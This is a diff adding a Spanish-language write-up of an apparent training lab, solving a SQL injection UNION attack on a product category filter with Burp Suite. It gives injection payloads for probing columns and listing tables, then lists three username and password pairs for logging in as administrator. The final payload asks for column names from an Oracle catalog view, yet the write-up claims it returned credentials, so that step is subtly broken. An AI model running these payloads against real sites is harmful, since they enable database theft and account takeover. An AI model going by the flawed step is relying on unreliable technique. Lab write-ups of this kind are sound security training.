@@ -1,0 +1,68 @@
+➡️ This lab contains a SQL injection vulnerability in the product category filter. 
+
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 
+
+To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+
+🎯 SOLUCIÓN DEL LABORATORIO
+
+    1️⃣ Seleccionar FoxyProxy
+
+        En el navegador seleccionamos la opción BURP en FoxyProxy para que BurpSuite intercepte las peticiones. 
+
+    2️⃣ Abrir BurpSuite
+
+        Se abre BurpSuite y vamos a Proxy > HTTP history
+
+    3️⃣ Para determinar el numero de columnas que devuelve la consulta y cuáles contienen datos de texto, hay que realizar la siguiente request: 
+
+        · Seleccionamos una categoría, por ejemplo all
+        · En HTTP History buscamos la request y la enviamos a Repeater para modificar la request
+        · En el parámetro category, se sustituye por el siguiente payload: 
+
+            '+UNION+SELECT+'abc','def'--
+
+        · Y nos devolverá lo siguiente: 
+
+            <table class="is-table-longdescription">
+                <tbody>
+                <tr>
+                    <th>abc</th>
+                    <td>def</td>
+                </tr>
+                </tbody>
+            </table>
+
+    4️⃣ El siguiente paso es recuperar la lista de tablas en la base de datos
+
+        · En category, se usa el siguiente payload: 
+
+            '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+    · Y si todo sale bien, tiene que salir el resultado con un listado con los nombres de las tablas.
+
+    · Buscar el nombre de la tabla que contiene las credenciales. 
+
+        users
+
+    5️⃣ Como el enunciado nos dice el nombre de la tabla y de las columnas, introducimos el siguiente payload: 
+
+        '+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users'--
+
+        · Nos devuelve las siguientes credenciales: 
+
+            carlos
+            mwgzl1nhf43esyoah0ej
+
+            administrator
+            8nuy0jtfvmd2v3y7rb4g
+
+            wiener
+            674eesi0fo4a6z8pmn4x
+        
+        7️⃣ Introducimos las credenciales de administrator en la ventana de login.
